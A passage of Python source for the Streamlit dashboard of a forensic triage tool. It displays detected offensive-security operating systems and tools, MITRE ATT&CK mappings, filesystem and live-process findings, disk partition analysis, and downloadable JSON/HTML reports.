        _os_data        = _parsed.get("os_profile", {})
        _live_data      = _parsed.get("live_analysis", {})
        _artefacts      = _os_data.get("filesystem_artefacts", [])

        (_rtab_ov, _rtab_tools, _rtab_mitre, _rtab_art,
         _rtab_live, _rtab_items, _rtab_json, _rtab_html, _rtab_exp) = st.tabs([
            "📊 Overview", "🛠 Tools", "⚔ MITRE", "📄 Artefacts",
            "🔬 Live", "📋 Risk Items", "🔢 JSON", "🌐 HTML", "📥 Export",
        ])

        with _rtab_ov:
            st.subheader(f"Executive Summary — {_hostname}")
            for _line in _summary: st.markdown(f"- {_line}")
            if _kill_chains:
                st.error("**Kill chains:** " + " | ".join(_kill_chains))
            if _os_data.get("indicators"):
                st.markdown("---")
                st.markdown(f"**OS:** `{_os_data.get('os_type','?')}` — {int(_os_data.get('confidence',0)*100)}% confidence")
                for _ind in _os_data.get("indicators",[]): st.markdown(f"  - {_ind}")

        with _rtab_tools:
            st.subheader(f"Detected Tools — {len(_detected_tools)}")
            _mi = {"package_db":"📦","filesystem":"📂","config":"⚙"}
            for _rk, _lbl, _em in [
                ("high_risk","High-Risk Offensive Tooling","⚠️"),
                ("anonymization","Anonymization Infrastructure","🕵️"),
                ("dual_use","Dual-Use Utilities","🔧"),
            ]:
                _grp = [t for t in _detected_tools if t.get("risk_level")==_rk]
                if not _grp: continue
                with st.expander(f"{_em} {_lbl} ({len(_grp)})", expanded=(_rk=="high_risk")):
                    for _t in _grp:
                        _ca, _cb, _cc = st.columns([2,4,2])
                        _ca.markdown(f"**`{_t.get('name','')}`**")
                        _cb.markdown(f"<small>{_t.get('description','')}</small>", unsafe_allow_html=True)
                        _mth = _t.get("detection_method","package_db")
                        _mtime = _t.get("mtime")
                        _atime = _t.get("atime")
                        import datetime
                        _time_str = ""
                        if _mtime:
                            _time_str += f"<br>Installed: {datetime.datetime.fromtimestamp(_mtime, datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
                        if _atime:
                            _time_str += f"<br>Last Used: {datetime.datetime.fromtimestamp(_atime, datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
                        else:
                            _time_str += f"<br>Last Used: -"
                        
                        _cc.markdown(f"`{_t.get('mitre_technique','').split(' ')[0]}` {_mi.get(_mth,'')} <small>{_mth}</small><div style='font-size:0.7em;color:#888'>{_time_str}</div>", unsafe_allow_html=True)

        with _rtab_mitre:
            st.subheader("MITRE ATT&CK Coverage")
            if _mitre_coverage:
                _tg = {}
                for _m in _mitre_coverage: _tg.setdefault(_m.get("tactic","Other"),[]).append(_m)
                for _tac, _ents in _tg.items():
                    st.markdown(f"**{_tac}**")
                    for _e in _ents:
                        _tid = _e.get("technique_id","")
                        _url = f"https://attack.mitre.org/techniques/{_tid.replace('.','/')}/"
                        st.markdown(f"- [`{_tid}`]({_url}) **{_e.get('technique_name','')}** — {', '.join('`'+t+'`' for t in _e.get('tools',[]))}")

        with _rtab_art:
            st.subheader(f"Filesystem Artefacts — {len(_artefacts)}")
            _ro = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3}
            for _a in sorted(_artefacts, key=lambda x: _ro.get(x.get("risk_level","LOW"),9)):
                _lvl = _a.get("risk_level","LOW")
                with st.expander(f"{RISK_EMOJI.get(_lvl,'.')} [{_lvl}] {_a.get('path','')}"):
                    st.markdown(_a.get("description",""))
                    if _a.get("snippet"): st.code(_a["snippet"], language="bash")

        with _rtab_live:
            st.subheader("Live Process Analysis")
            if not _live_data:
                st.info("No live data in this bundle.")
            else:
                _lc1, _lc2 = st.columns(2)
                _lc1.metric("Processes Scanned",    _live_data.get("total_processes_scanned",0))
                _lc2.metric("Suspicious Processes", len(_live_data.get("findings",[])))
                for _pf in _live_data.get("findings",[]):
                    with st.expander(f"PID {_pf.get('pid')} — {_pf.get('comm','')}"):
                        if _pf.get("cmdline"): st.code(_pf["cmdline"], language="bash")
                        for _n in _pf.get("notes",[]): st.warning(_n)

        with _rtab_items:
            st.subheader(f"All Risk Items — {len(_risk_items)}")
            for _lvl in ("CRITICAL","HIGH","MEDIUM","LOW","INFO"):
                _li = [i for i in _risk_items if i.get("risk_level")==_lvl]
                if not _li: continue
                _c = RISK_COLOURS.get(_lvl,"#888")
                with st.expander(f"{RISK_EMOJI.get(_lvl,'')} {_lvl} ({len(_li)})", expanded=(_lvl in ("CRITICAL","HIGH"))):
                    for _item in _li:
                        _extra = ""
                        if _item.get("mitre_technique"):
                            _tid2 = _item["mitre_technique"]
                            _u2   = f"https://attack.mitre.org/techniques/{_tid2.replace('.','/')}/"
                            _extra += f"<br><small style='color:#555'>🎯 <a href='{_u2}' target='_blank'>{_tid2}</a> · {_item.get('mitre_category','')}</small>"
                        if _item.get("evidence"):
                            _extra += f"<br><small style='color:#555'>🔎 {_item['evidence']}</small>"
                        st.markdown(
                            f"<div style='border-left:3px solid {_c};padding:0.4rem 0.8rem;"
                            f"margin-bottom:0.4rem;color:#333;background:#fafafa;border-radius:0 4px 4px 0'>"
                            f"<strong>{_item.get('title','')}</strong><br>"
                            f"<span style='color:#555'>{_item.get('description','')}</span>{_extra}</div>",
                            unsafe_allow_html=True,
                        )

        with _rtab_json:
            st.subheader("Raw JSON")
            if _json_report:
                st.code(_json_report[:6000] + ("..." if len(_json_report)>6000 else ""), language="json")

        with _rtab_html:
            st.subheader("HTML Report Preview")
            if _html_report:
                st.components.v1.html(_html_report, height=850, scrolling=True)

        with _rtab_exp:
            _ej, _eh = st.columns(2)
            with _ej:
                if _json_report:
                    st.download_button("Download JSON", data=_json_report,
                        file_name=f"pmgp_{_hostname}_{_timestamp}.json",
                        mime="application/json", use_container_width=True)
            with _eh:
                if _html_report:
                    st.download_button("Download HTML", data=_html_report,
                        file_name=f"pmgp_{_hostname}_{_timestamp}.html",
                        mime="text/html", use_container_width=True)

        st.markdown("---")
        _col_a, _col_b = st.columns(2)
        with _col_a:
            if st.button("🔄 Wait for next target", use_container_width=True):
                if _STATE_FILE.exists(): _STATE_FILE.unlink()
                st.session_state.remote_wait_start = _time.time()
                st.session_state.remote_last_ts    = None
                st.rerun()
        with _col_b:
            if st.button("⏹ Stop remote mode", use_container_width=True):
                st.session_state.remote_listening = False
                st.rerun()

        _time.sleep(_POLL_INTERVAL)
        st.rerun()

    st.stop()


result: PipelineResult = st.session_state.get("last_result")
if result is None:
    st.stop()

if not result.success:
    st.error("Pipeline failed:\n" + "\n".join(result.errors))
    st.stop()


# ── Results ───────────────────────────────────────────────────────────────────
rr     = result.risk_report
colour = RISK_COLOURS.get(rr.overall_risk, "#333")
op = result.os_profile
tr = result.tool_result
lr = result.live_result

RISK_GRADIENTS = {
    "CRITICAL": "linear-gradient(135deg,#7f1d1d,#dc2626)",
    "HIGH":     "linear-gradient(135deg,#7c2d12,#ea580c)",
    "MEDIUM":   "linear-gradient(135deg,#713f12,#ca8a04)",
    "LOW":      "linear-gradient(135deg,#14532d,#16a34a)",
    "INFO":     "linear-gradient(135deg,#1e3a5f,#2563eb)",
}
gradient = RISK_GRADIENTS.get(rr.overall_risk, "linear-gradient(135deg,#1e293b,#334155)")

st.markdown(
    f'<div class="risk-banner" style="background:{gradient}">'
    f'<span style="font-size:1.8rem">{RISK_EMOJI.get(rr.overall_risk,"⚪")}</span> '
    f'&nbsp;{rr.overall_risk} RISK'
    f'<span style="font-size:1rem; opacity:0.85; font-weight:500;"> &nbsp;—&nbsp; '
    f'Score: <strong>{rr.risk_score}/100</strong> &nbsp;·&nbsp; '
    f'Completed in {result.elapsed_seconds:.2f}s</span></div>',
    unsafe_allow_html=True,
)

if rr.kill_chains:
    for chain in rr.kill_chains:
        st.markdown(
            f'<div class="killchain-banner">'
            f'<span style="color:#f87171;font-weight:700;">⚔ KILL CHAIN</span> &nbsp;{chain}'
            f'</div>',
            unsafe_allow_html=True,
        )

if result.errors:
    with st.expander("⚠️ Pipeline warnings"):
        for e in result.errors: st.warning(e)

# ── Metrics ───────────────────────────────────────────────────────────────────
m1, m2, m3, m4, m5, m6 = st.columns(6)
m1.metric("OS Detected",      op.os_type.value.split(" ")[0])
m2.metric("Confidence",       f"{op.confidence:.0%}")
m3.metric("Tools Found",      len(tr.detected_tools))
m4.metric("Packages Scanned", tr.total_packages_scanned)
m5.metric("MITRE Techniques", len(rr.mitre_coverage))
m6.metric("Earliest Suspicious Install", getattr(rr, 'time_of_attack', 'Not determined').split(' ')[0])

if lr and lr.is_live_system:
    n1, n2, n3 = st.columns(3)
    n1.metric("Processes Scanned",      lr.total_processes_scanned)
    n2.metric("Suspicious Processes",   len(lr.process_findings))
    n3.metric("Suspicious Connections", len(lr.suspicious_connections))

st.markdown("---")

tab_os, tab_tools, tab_mitre, tab_artefacts, tab_live, tab_disk, tab_items, tab_export = st.tabs([
    "🖥 OS Profile", "🛠 Tools", "⚔ MITRE", "📄 Artefacts",
    "🔬 Live /proc", "💾 Disk", "📋 Risk Items", "📥 Export",
])

with tab_os:
    st.subheader("Operating System Profile")
    col1, col2 = st.columns([3, 1])
    with col1:
        st.markdown(f"**OS Type:** `{op.os_type.value}`")
        if getattr(op, "tails_disk_confirmed", False):
            st.warning("✔ Tails OS confirmed by disk partition analysis")
        st.markdown(f"**Package DB:** `{op.pkg_db_type}` — `{op.pkg_db_path or 'N/A'}`")
        st.progress(int(op.confidence * 100), text=f"Detection Confidence: {op.confidence:.0%}")
        st.markdown("**Detection Indicators:**")
        for ind in op.indicators: st.markdown(f"- {ind}")
    with col2:
        icon = {"Kali Linux": "🐉", "BlackArch Linux": "🏴", "Tails OS": "👻"}.get(
            op.os_type.value, "🐧"
        )
        st.markdown(
            f"<div style='font-size:5rem;text-align:center;padding-top:1rem'>{icon}</div>",
            unsafe_allow_html=True,
        )

with tab_tools:
    st.subheader(f"Detected Tools — {len(tr.detected_tools)} total")
    method_icons = {"package_db": "📦", "filesystem": "📂", "config": "⚙"}
    for risk_key, label, emoji in [
        ("high_risk",     "High-Risk Offensive Tooling",       "⚠️"),
        ("anonymization", "Anonymization Infrastructure",      "🕵️"),
        ("dual_use",      "Dual-Use Cybersecurity Utilities",  "🔧"),
    ]:
        tools = tr.by_risk[risk_key]
        if not tools: continue
        with st.expander(f"{emoji} {label} ({len(tools)})", expanded=(risk_key == "high_risk")):
            for t in tools:
                ca, cb, cc, cd = st.columns([2, 3, 3, 2])
                ca.markdown(f"**`{t.name}`**")
                cb.markdown(f"<small>{t.description}</small>", unsafe_allow_html=True)
                cc.markdown(
                    f'<span class="mitre-tag">{t.mitre_technique}</span>'
                    f'<span class="mitre-tag">{t.category}</span>',
                    unsafe_allow_html=True,
                )
                
                _time_str = ""
                import datetime
                if t.mtime:
                    _time_str += f"<br><small style='color:#888'>Installed: {datetime.datetime.fromtimestamp(t.mtime, datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}</small>"
                
                _atime_val = getattr(t, 'atime', None)
                if _atime_val:
                    _time_str += f"<br><small style='color:#888'>Last Used: {datetime.datetime.fromtimestamp(_atime_val, datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}</small>"
                else:
                    _time_str += f"<br><small style='color:#888'>Last Used: -</small>"

                cd.markdown(
                    f"{method_icons.get(t.detection_method, '')} "
                    f"<small>{t.detection_method}</small>{_time_str}",
                    unsafe_allow_html=True,
                )
    if tr.filesystem_hits:
        with st.expander(f"📂 Non-packaged binary paths ({len(tr.filesystem_hits)})"):
            for p in tr.filesystem_hits:
                st.code(p, language="bash")
    if tr.config_hits:
        with st.expander(f"⚙ Configuration traces ({len(tr.config_hits)})"):
            for p in tr.config_hits:
                st.code(p, language="bash")
    if not tr.detected_tools:
        st.success("✅ No suspicious tools detected.")

with tab_mitre:
    st.subheader("MITRE ATT&CK Coverage")
    if rr.kill_chains:
        st.error("**Kill chains detected:** " + " | ".join(rr.kill_chains))
    if rr.mitre_coverage:
        tactic_groups: dict = {}
        for m in rr.mitre_coverage:
            tactic_groups.setdefault(m.tactic, []).append(m)
        for tactic, entries in tactic_groups.items():
            st.markdown(f"**{tactic}**")
            for e in entries:
                url = f"https://attack.mitre.org/techniques/{e.technique_id.replace('.', '/')}/"
                st.markdown(
                    f"- [`{e.technique_id}`]({url}) **{e.technique_name}** — "
                    + ", ".join(f"`{t}`" for t in e.tools)
                )
    else:
        st.info("No MITRE ATT&CK techniques mapped.")

with tab_artefacts:
    st.subheader(f"Filesystem Artefacts — {len(op.filesystem_artefacts)} found")
    if op.filesystem_artefacts:
        risk_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        sorted_artefacts = sorted(
            op.filesystem_artefacts,
            key=lambda a: risk_order.get(a.risk_level, 9),
        )
        for a in sorted_artefacts:
            level_colour = RISK_COLOURS.get(a.risk_level, "#888")
            with st.expander(
                f"{RISK_EMOJI.get(a.risk_level, '•')} [{a.risk_level}] {a.path} — {a.artefact_type}"
            ):
                st.markdown(a.description)
                if a.snippet:
                    st.code(a.snippet, language="bash")
    else:
        st.success("✅ No filesystem artefacts found.")

with tab_live:
    st.subheader("Live Process Analysis (/proc)")
    if lr is None:
        st.info("Live analysis was not run.")
    elif not lr.is_live_system:
        st.info("Not a live system or /proc not available.")
    else:
        if lr.process_findings:
            for pf in lr.process_findings:
                with st.expander(f"PID {pf.pid} — {pf.comm}"):
                    if pf.cmdline:
                        st.code(pf.cmdline, language="bash")
                    for note in pf.notes: st.warning(note)
                    if pf.suspicious_vars:
                        st.code(
                            "\n".join(f"{k}={v}" for k, v in pf.suspicious_vars.items()),
                            language="bash",
                        )
                    if pf.suspicious_maps:
                        st.markdown("**Suspicious memory-mapped files:**")
                        for m in pf.suspicious_maps:
                            st.code(m, language="bash")
        else:
            st.success("✅ No suspicious volatile process indicators found.")

        if lr.suspicious_connections:
            st.subheader(f"🌐 Suspicious Network Connections ({len(lr.suspicious_connections)})")
            conn_data = [
                {
                    "Protocol": c.protocol.upper(),
                    "Local": f"{c.local_addr}:{c.local_port}",
                    "Remote": f"{c.remote_addr}:{c.remote_port}",
                    "State": c.state,
                }
                for c in lr.suspicious_connections
            ]
            st.dataframe(conn_data, use_container_width=True)

with tab_disk:
    st.subheader("Disk / Partition Analysis")
    dr = result.disk_result
    if dr is None:
        st.info("Disk image analysis was not run. Provide a disk image path in the sidebar.")
    elif dr.error_message:
        st.error(dr.error_message)
    else:
        col_a, col_b, col_c = st.columns(3)
        col_a.metric("Partitions Found",     len(dr.partitions))
        col_b.metric("Encrypted Partitions", len(dr.encrypted_partitions))
        col_c.metric("TailsData Found",      "Yes ⚠️" if dr.tails_data_found else "No ✅")
        if dr.partitions:
            st.dataframe(
                [{"#": p.index, "Label": p.label, "Size (MB)": p.size_mb,
                  "Encrypted": (p.luks_version if p.has_luks_header else "—"),
                  "Risk": p.risk_label, "Note": p.risk_note}
                 for p in dr.partitions],
                use_container_width=True,
            )
        for note in dr.notes: st.info(note)

with tab_items:
    source_icons = {
        "tool": "🛠", "process": "⚙", "disk": "💾",
        "os": "🖥", "artefact": "📄", "network": "🌐", "killchain": "⚔",
    }
    LEVEL_BG     = {"CRITICAL":"rgba(220,38,38,0.1)","HIGH":"rgba(234,88,12,0.1)",
                    "MEDIUM":"rgba(202,138,4,0.1)","LOW":"rgba(22,163,74,0.1)","INFO":"rgba(37,99,235,0.1)"}
    LEVEL_BORDER = {"CRITICAL":"#dc2626","HIGH":"#ea580c","MEDIUM":"#ca8a04","LOW":"#16a34a","INFO":"#2563eb"}
    st.markdown(
        f"<div class='section-header'>All Risk Items "
        f"<span style='opacity:0.5;font-size:0.9rem;font-weight:500;'>({len(rr.items)} total)</span></div>",
        unsafe_allow_html=True,
    )
    for level in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
        items = rr.items_by_level.get(level, [])
        if not items: continue
        bc = LEVEL_BORDER.get(level, "#888")
        bg = LEVEL_BG.get(level, "rgba(255,255,255,0.03)")
        with st.expander(
            f"{RISK_EMOJI.get(level,'')} {level}  ({len(items)})",
            expanded=(level in ("CRITICAL", "HIGH")),
        ):
            for item in items:
                icon  = source_icons.get(item.source, "•")
                extra = ""
                if item.mitre_technique:
                    tid = item.mitre_technique
                    url = f"https://attack.mitre.org/techniques/{tid.replace('.','/')}/"
                    extra += (f"<br><span style='font-size:0.78rem;color:#64748b;'>"
                              f"🎯 <a href='{url}' target='_blank' style='color:#63b3ed;'>{tid}</a>"
                              f" &nbsp;·&nbsp; {item.mitre_category}</span>")
                if item.evidence:
                    extra += f"<br><span style='font-size:0.78rem;color:#475569;'>🔎 {item.evidence}</span>"
                st.markdown(
                    f"<div style='border-left:3px solid {bc};background:{bg};"
                    f"border-radius:0 10px 10px 0;padding:0.7rem 1rem;margin-bottom:0.45rem;'>"
                    f"<div style='display:flex;align-items:flex-start;gap:8px;'>"
                    f"<span style='font-size:1rem;'>{icon}</span>"
                    f"<div><strong style='color:#e2e8f0;font-size:0.9rem;'>{item.title}</strong><br>"
                    f"<span style='color:#94a3b8;font-size:0.84rem;'>{item.description}</span>"
                    f"{extra}</div></div></div>",
                    unsafe_allow_html=True,
                )

with tab_export:
    st.markdown("<div class='section-header'>Download Reports</div>", unsafe_allow_html=True)
    col_j, col_h = st.columns(2)
    with col_j:
        st.markdown("""<div style='background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);
            border-radius:12px;padding:1rem;margin-bottom:0.5rem;'>
            <div style='color:#94a3b8;font-size:0.75rem;font-weight:600;letter-spacing:0.8px;
            text-transform:uppercase;margin-bottom:0.5rem;'>JSON Report</div>
            <div style='color:#64748b;font-size:0.8rem;'>Structured forensic data — ingest into SIEM or case management</div>
            </div>""", unsafe_allow_html=True)
        st.download_button("⬇ Download JSON", data=result.json_report,
                           file_name="pmgp_report.json", mime="application/json",
                           use_container_width=True)
        with st.expander("Preview JSON (first 3 KB)"):
            st.code(result.json_report[:3000] + ("…" if len(result.json_report)>3000 else ""), language="json")
    with col_h:
        st.markdown("""<div style='background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);
            border-radius:12px;padding:1rem;margin-bottom:0.5rem;'>
            <div style='color:#94a3b8;font-size:0.75rem;font-weight:600;letter-spacing:0.8px;
            text-transform:uppercase;margin-bottom:0.5rem;'>HTML Report</div>
            <div style='color:#64748b;font-size:0.8rem;'>Self-contained — no internet required, opens on air-gapped machines</div>
            </div>""", unsafe_allow_html=True)
        st.download_button("⬇ Download HTML", data=result.html_report,
                           file_name="pmgp_report.html", mime="text/html",
                           use_container_width=True)
    if result.json_path: st.success(f"JSON saved: `{result.json_path}`")
    if result.html_path: st.success(f"HTML saved: `{result.html_path}`")